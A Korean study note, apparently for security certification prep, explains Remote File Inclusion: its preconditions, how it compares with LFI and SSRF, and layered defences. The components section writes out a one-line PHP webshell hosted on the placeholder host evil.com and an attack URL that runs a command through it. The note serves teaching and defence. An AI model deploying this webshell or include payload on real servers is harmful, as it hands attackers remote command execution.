+++
weight = 422
title = "원격 파일 포함 (RFI, Remote File Inclusion) — 외부 공격 스크립트 실행"
date = "2026-03-28"
[extra]
categories = ["studynote-security"]
+++
## 0. 핵심 인사이트

>

> 📝 모범 답안

- **외부 스크립트의 강제 포함**: 공격자가 통제하는 외부 서버의 URL을 애플리케이션의 `include` 등의 함수에 주입하여 원격지의 악성 코드를 서버에서 직접 실행하는 기법임.
- **가장 치명적인 웹 취약점**: 로컬에 없는 파일도 주입 가능하여 백도어 설치 및 원격 제어가 매우 용이하며, 성공 시 즉각적으로 전체 시스템이 장악됨.
- **설정 및 검증의 결합**: 서버 설정(`allow_url_include=On`)이 활성화되어 있고, 입력값에 대한 도메인 검증이 부재할 때 발생하는 치명적 결함임.

### 1. 개요 및 필요성
- **배경:** 대규모 포털이나 CMS에서 공통 기능이나 외부 API 결과를 동적으로 로드하는 과정에서 입력값에 대한 URL 검증을 소홀히 하여 발생하기 시작함.
- **정의:** 애플리케이션의 파일 로딩 기능에 외부 원격 서버의 경로(`http://evil.com/shell.txt`)를 삽입하여, 해당 파일의 내용을 로컬 실행 환경에서 그대로 해석/실행하게 만드는 공격임.
- **위험성:** 공격자가 별도의 파일 업로드 없이도 백도어(Webshell)를 실행할 수 있어 파급력이 압도적으로 큼.

### 2. 구성요소
```text
[ Remote File Inclusion Attack Process ]

Attacker Server (evil.com):
- Hosts 'shell.txt' containing: <?php system($_GET['cmd']); ?
Victim Server (target.com):
- Vulnerable URL: /index?page=http://evil.com/shell.txt

Execution Flow:
1. Attacker sends URL with remote path.
2. target.com downloads 'shell.txt' content.
3. target.com script engine (e.g., PHP) EXECUTES 'shell.txt'.
   - Even if extension is .txt, it's executed as code.
4. Attacker gains Full Command Execution (RCE).
   - GET /index?page=http://evil.com/shell.txt&cmd=ls -la
```
- **발생 조건:** PHP의 경우 `allow_url_fopen`과 `allow_url_include` 설정이 모두 `On`이어야 공격이 성립함. 현대의 대다수 설정은 보안을 위해 `Off`로 유지함.
- **공격 다양화:** HTTP뿐만 아니라 FTP, SMB 등의 프로토콜을 이용하거나, IP 대신 도메인 이름을 사용하여 탐지를 우회함.

### 3. 구조 및 동작 원리
| 비교 항목 | 원격 파일 포함 (RFI) | 로컬 파일 포함 (LFI) | SSRF (Request Forgery) |
| :--- | :--- | :--- | :--- |
| **파일 소스** | 외부 공격자 서버 (Remote) | 피해 서버 로컬 파일 (Local) | 외부/내부 서버 (Request) |
| **핵심 목적** | **원격 코드 실행 (RCE)** | RCE 또는 정보 유출 | 내부망 접근/스캔 |
| **설정 영향** | `allow_url_include` 필수 | 설정 무관 (경로 조작) | 서버 라이브러리 영향 |
| **공격 결과** | 즉각적인 시스템 점유 | 다단계 공격 (로그 주입 등) | 권한 우회 및 정보 탈취 |

### 4. 비교 및 트레이드오프
- **적용 사례:** RSS 리더기, 외부 데이터 통합 대시보드, 동적 애드 네트워크 연동 모듈.
- **기술사적 판단:** RFI는 웹 서버 설정(Hardening) 하나로도 대부분 방어 가능하지만, 코드 레벨에서의 방어가 수반되지 않으면 설정 실수 시 치명적임. 따라서 기술사적 관점에서는 "설정(Setting) - 검증(Validation) - 격리(Isolation)"의 3중 방어 체계가 필수임. 화이트리스트 기반의 도메인 검증이 불가능하다면, 외부 자원은 절대로 실행 컨텍스트(include 등)에 두어서는 안 됨.

### 5. 실무 적용 및 최적화 기법
- **기대효과:** 외부 신뢰할 수 없는 자원의 유입을 차단하여 공급망 공격(Supply Chain Attack)의 초기 진입점을 봉쇄하고 인프라 가용성을 보호함.
- **결론:** 현대 웹 아키텍처는 마이크로서비스(MSA) 간 통신이 잦아 RFI와 유사한 형태의 위협이 늘어나고 있음. Zero Trust 원칙에 기반하여 모든 외부 입력은 '악의적'으로 간주하고 처리하는 보안 문화의 정착이 시급함.

### 📌 관련 개념 맵 (Knowledge Graph)
- **상위 개념:** RCE (Remote Code Execution), 원격 자원 로딩 취약점
- **하위/파생 개념:** Webshell, Malicious Redirect, allow_url_include, SSRF

### 👶 어린이를 위한 3줄 비유 설명
- 친구에게 "우리 집 책장 3번 책 읽어줘"라고 해야 하는데, "나쁜 나라 도둑의 거짓말 책을 가져와서 읽어줘"라고 시키는 것과 같아요.
- 그 나쁜 책을 읽고 시키는 대로 하면(코드 실행), 우리 집이 도둑에게 뺏길 수도 있어요.
- 그래서 모르는 사람이 쓴 책은 절대로 우리 집 안에서 읽어주면 안 된답니다!
